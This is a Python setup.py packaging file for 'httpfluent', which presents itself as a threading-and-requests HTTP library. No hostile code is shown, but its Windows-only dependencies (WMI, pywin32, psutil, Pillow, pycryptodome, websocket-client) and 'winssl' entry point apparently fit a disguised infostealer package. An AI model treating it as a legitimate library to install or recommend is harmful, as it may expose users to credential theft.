from setuptools import setup, find_packages

setup(
    name="httpfluent",
    version="0.1",
    author="Anto miliano",
    author_email="antomiliano785@gmail.com",
    description="Its a python library that can use threading and requests same time",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://httpfluent.readme.org/",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "Topic :: Internet :: WWW/HTTP",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Programming Language :: Python :: 3.13",        
        "License :: OSI Approved :: Apache Software License",
        "Operating System :: OS Independent",
    ],
    keywords='http fluent requests aiohttp threading',
    project_urls={
        'Documentation': 'https://httpfluent.readme.org/',
    },
    python_requires='>=3.9',
    install_requires=[
        "requests",
        "requests[socks]",
        "pycryptodome",
        "chardet",
        "idna",
        "pywin32",
        "WMI",
        "psutil",
        "Pillow",
        "urllib3",
        "certifi",
        "websocket-client"
    ],
    entry_points={
        'console_scripts': [
            'httpfluent=httpfluent.winssl:main',
        ],
    },
    include_package_data=True,
    zip_safe=False,
    platforms=["win64"],
)


